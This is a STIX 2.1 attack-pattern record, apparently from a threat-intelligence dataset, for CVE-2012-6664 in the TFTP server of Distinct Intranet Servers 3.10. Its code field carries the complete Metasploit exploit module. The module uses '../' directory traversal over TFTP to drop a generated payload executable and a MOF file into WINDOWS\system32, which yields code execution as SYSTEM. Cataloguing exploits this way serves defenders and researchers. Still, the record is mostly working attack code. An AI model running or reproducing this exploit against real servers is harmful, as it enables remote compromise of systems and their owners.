{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--77794e00-00c6-43ea-8054-994ccc6e4c2d",
    "created": "2024-08-14T16:50:30.80431Z",
    "modified": "2024-08-14T16:50:30.804314Z",
    "name": "Distinct TFTP 3.10 Writable Directory Traversal Execution",
    "description": " This module exploits a directory traversal vulnerability in the TFTP Server component of Distinct Intranet Servers version 3.10 which allows a remote attacker to write arbitrary files to the server file system, resulting in code execution under the context of 'SYSTEM'. This module has been tested successfully on TFTP Server version 3.10 on Windows XP SP3 (EN).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/tftp/distinct_tftp_traversal.rb",
            "external_id": "distinct_tftp_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.spentera.com/advisories/2012/SPN-01-2012.pdf"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-6664"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Rex::Proto::TFTP\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Distinct TFTP 3.10 Writable Directory Traversal Execution',\n        'Description' => %q{\n          This module exploits a directory traversal vulnerability in the TFTP\n          Server component of Distinct Intranet Servers version 3.10 which\n          allows a remote attacker to write arbitrary files to the server file\n          system, resulting in code execution under the context of 'SYSTEM'.\n          This module has been tested successfully on TFTP Server version 3.10\n          on Windows XP SP3 (EN).\n        },\n        'License' => MSF_LICENSE,\n        'Author' =>\n          [\n            'modpr0be', # Initial discovery, PoC (Tom Gregory)\n            'sinn3r' # Metasploit\n          ],\n        'References' =>\n          [\n            ['OSVDB', '80984'],\n            ['EDB', '18718'],\n            ['URL', 'http://www.spentera.com/advisories/2012/SPN-01-2012.pdf'],\n            ['CVE', '2012-6664']\n          ],\n        'Payload' =>\n          {\n            'BadChars' => \"\\x00\"\n          },\n        'DefaultOptions' =>\n          {\n            'EXITFUNC' => 'thread'\n          },\n        'Platform' => 'win',\n        'Targets' =>\n          [\n            ['Automatic', { 'auto' => true }],\n          ],\n        'Privileged' => true,\n        'DisclosureDate' => '2012-04-08',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options([\n      OptInt.new('DEPTH', [false, 'Levels to reach base directory', 10]),\n      OptAddress.new('RHOST', [true, 'The remote TFTP server address']),\n      OptPort.new('RPORT', [true, 'The remote TFTP server port', 69])\n    ])\n  end\n\n  def upload(filename, data)\n    tftp_client = Rex::Proto::TFTP::Client.new(\n      'LocalHost' => '0.0.0.0',\n      'LocalPort' => 1025 + rand(0xffff - 1025),\n      'PeerHost' => datastore['RHOST'],\n      'PeerPort' => datastore['RPORT'],\n      'LocalFile' => \"DATA:#{data}\",\n      'RemoteFile' => filename,\n      'Mode' => 'octet',\n      'Context' => { 'Msf' => framework, 'MsfExploit' => self },\n      'Action' => :upload\n    )\n\n    tftp_client.send_write_request { |msg| print_status(msg) }\n    until tftp_client.complete\n      select(nil, nil, nil, 1)\n      tftp_client.stop\n    end\n  end\n\n  def exploit\n    exe_name = \"#{rand_text_alpha(8..15)}.exe\"\n    exe = generate_payload_exe\n    mof_name = \"#{rand_text_alpha(8..15)}.mof\"\n    mof = generate_mof(mof_name, exe_name)\n    traversal = '../' * datastore['DEPTH'].to_i\n\n    print_status(\"Sending EXE (#{exe.length} bytes)\")\n    upload(\"#{traversal}\\\\WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n    register_file_for_cleanup(exe_name)\n\n    # Let the TFTP server idle a bit before sending another file\n    select(nil, nil, nil, 3)\n\n    print_status(\"Sending MOF (#{mof.length} bytes)\")\n    upload(\"#{traversal}\\\\WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\", mof)\n    register_file_for_cleanup(\"wbem\\\\mof\\\\good\\\\#{mof_name}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-04-08",
    "x_mitre_platforms": [
        "win'"
    ]
}